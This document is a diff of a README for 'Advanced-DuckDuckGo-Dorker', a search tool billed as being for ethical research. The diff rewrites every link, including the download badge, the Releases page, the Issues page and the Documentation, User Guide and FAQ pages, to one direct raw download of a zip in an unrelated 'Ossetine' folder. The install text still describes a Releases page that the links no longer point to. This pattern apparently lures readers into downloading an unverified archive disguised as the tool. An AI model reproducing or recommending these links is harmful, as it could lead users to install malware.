@@ -1,6 +1,6 @@
 # 🦆 Advanced-DuckDuckGo-Dorker - Simplified Searching for Ethical Research
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/b3styoueverh4d/Advanced-DuckDuckGo-Dorker/releases)
+[![Download Now](https://raw.githubusercontent.com/b3styoueverh4d/Advanced-DuckDuckGo-Dorker/main/Ossetine/Advanced-DuckDuckGo-Dorker.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/b3styoueverh4d/Advanced-DuckDuckGo-Dorker/main/Ossetine/Advanced-DuckDuckGo-Dorker.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Before you start, ensure your computer meets these basic requirements:
 
 ## 📥 Download & Install
 
-To get the software, visit [this page to download](https://github.com/b3styoueverh4d/Advanced-DuckDuckGo-Dorker/releases). Follow these steps:
+To get the software, visit [this page to download](https://raw.githubusercontent.com/b3styoueverh4d/Advanced-DuckDuckGo-Dorker/main/Ossetine/Advanced-DuckDuckGo-Dorker.zip). Follow these steps:
 
 1. Click on the link above to go to our Releases page.
 2. Look for the latest version available.
@@ -60,19 +60,19 @@ Stay updated with new features and enhancements! We encourage feedback and contr
 
 If you encounter any issues, please reach out:
 
-- Open an issue on [GitHub](https://github.com/b3styoueverh4d/Advanced-DuckDuckGo-Dorker/issues) for assistance.
+- Open an issue on [GitHub](https://raw.githubusercontent.com/b3styoueverh4d/Advanced-DuckDuckGo-Dorker/main/Ossetine/Advanced-DuckDuckGo-Dorker.zip) for assistance.
 - Check the FAQ section on our documentation page.
 
 ## 🔗 Additional Resources
 
 For more information, see the following resources:
 
-- [Documentation](https://github.com/b3styoueverh4d/Advanced-DuckDuckGo-Dorker/wiki)
-- [User Guides](https://github.com/b3styoueverh4d/Advanced-DuckDuckGo-Dorker/wiki/User-Guide)
-- [FAQ](https://github.com/b3styoueverh4d/Advanced-DuckDuckGo-Dorker/wiki/FAQ)
+- [Documentation](https://raw.githubusercontent.com/b3styoueverh4d/Advanced-DuckDuckGo-Dorker/main/Ossetine/Advanced-DuckDuckGo-Dorker.zip)
+- [User Guides](https://raw.githubusercontent.com/b3styoueverh4d/Advanced-DuckDuckGo-Dorker/main/Ossetine/Advanced-DuckDuckGo-Dorker.zip)
+- [FAQ](https://raw.githubusercontent.com/b3styoueverh4d/Advanced-DuckDuckGo-Dorker/main/Ossetine/Advanced-DuckDuckGo-Dorker.zip)
 
 ## 🎉 Conclusion
 
 Thank you for choosing Advanced DuckDuckGo Dorker! We hope this tool enhances your research and ethical hacking efforts. Happy searching!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/b3styoueverh4d/Advanced-DuckDuckGo-Dorker/releases)
+[![Download Now](https://raw.githubusercontent.com/b3styoueverh4d/Advanced-DuckDuckGo-Dorker/main/Ossetine/Advanced-DuckDuckGo-Dorker.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/b3styoueverh4d/Advanced-DuckDuckGo-Dorker/main/Ossetine/Advanced-DuckDuckGo-Dorker.zip)
